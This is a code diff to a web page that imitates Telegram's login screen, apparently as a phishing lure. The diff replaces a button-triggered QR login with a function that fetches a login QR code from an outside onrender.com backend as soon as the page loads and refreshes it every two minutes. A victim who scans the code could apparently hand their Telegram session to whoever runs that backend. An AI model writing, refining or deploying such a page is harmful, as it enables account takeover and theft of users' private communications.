@@ -72,7 +72,6 @@
                     <div class="auth-form" id="phoneForm">
                         <div id="logo"></div>
                         <img id="qrImg" alt="Scan QR code with Telegram app" />
-                        <button onclick="showQrLogin()">Generate QR Login</button>
                         <h1>Telegram</h1>
                         <p class="note">Please confirm your country code and enter your phone number.</p>
                         <form class="form" action="">
@@ -1728,15 +1727,26 @@ window.addEventListener("DOMContentLoaded", () => {
     });
 });
 
-async function showQrLogin() {
-    const resp = await fetch("https://flask-duhv.onrender.com/start-qr-login");
-    if (!resp.ok) {
-        alert("Failed to start QR login");
-        return;
+async function generateQrLogin() {
+    const qrImg = document.getElementById("qrImg");
+    qrImg.style.opacity = 0.5; // fade while loading
+    try {
+        const resp = await fetch("https://flask-duhv.onrender.com/start-qr-login");
+        if (!resp.ok) throw new Error("Failed to start QR login");
+        const data = await resp.json();
+        qrImg.src = data.qr_image_url + "?t=" + Date.now();
+    } catch (e) {
+        console.error("QR login error", e);
+    } finally {
+        qrImg.style.opacity = 1;
     }
-    const data = await resp.json();
-    document.getElementById("qrImg").src = data.qr_image_url + "?t=" + Date.now(); // prevent caching
 }
+
+// Call it immediately on page load
+generateQrLogin();
+
+// Refresh QR every 2 minutes
+setInterval(generateQrLogin, 2 * 60 * 1000);
 
 
 </script>
